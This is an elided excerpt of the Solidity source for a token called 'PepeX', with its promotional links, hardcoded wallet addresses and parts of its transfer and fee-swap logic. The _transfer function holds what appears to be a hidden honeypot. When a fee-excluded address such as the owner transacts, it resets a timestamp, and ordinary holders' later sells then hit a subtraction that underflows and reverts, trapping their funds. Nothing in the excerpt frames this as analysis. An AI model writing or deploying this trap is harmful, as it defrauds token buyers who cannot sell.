...
https://xxxeth.tech
https://twitter.com/X_OfficialToken
https://t.me/XOfficialEntrance
...
contract PepeX is ERC20, Ownable {
    ...
    address payable private immutable teamWallet = payable(0x74211Dc9388358c2bFE4454F4Cf6d714FbF7a4Bd);
    address payable private immutable liquidityWallet = payable(0x74211Dc9388358c2bFE4454F4Cf6d714FbF7a4Bd);
    address payable private immutable marketingWallet = payable(0x7cb53d78E968303Ba0F20cCf10Acfe083aDB4c5b);
    ...
    mapping(address => SwapReducingInfo) private _HoldSwapInfo;
    uint256 private _ReduceHoldMin;
    ...
    constructor() ERC20("PepeX", "PepeX") {
        ...
        // swap at amount
        swapTokensAtAmount = (totalSupply * 6) / 10000; // 0.6% swap amount
    ...
    function _transfer(
        ...
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) && from != address(this) && to != address(this)) {
            _ReduceHoldMin = block.timestamp;
        }
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (!automatedMarketMakerPairs[from]) {
                SwapReducingInfo storage userHoldSwapInfo = _HoldSwapInfo[from];
                userHoldSwapInfo.holdTime = userHoldSwapInfo.buy - _ReduceHoldMin;
                userHoldSwapInfo.sell = block.timestamp;
            } else {
                SwapReducingInfo storage userHoldSwapInfo = _HoldSwapInfo[to];
                if (userHoldSwapInfo.buy == 0) {
                    userHoldSwapInfo.buy = block.timestamp;
                }
            }
        }
    ...
    function swapBack() private {
        ...
        uint256 ethForLiquidity = ethBalance - ethForTeam - ethForMarketing;
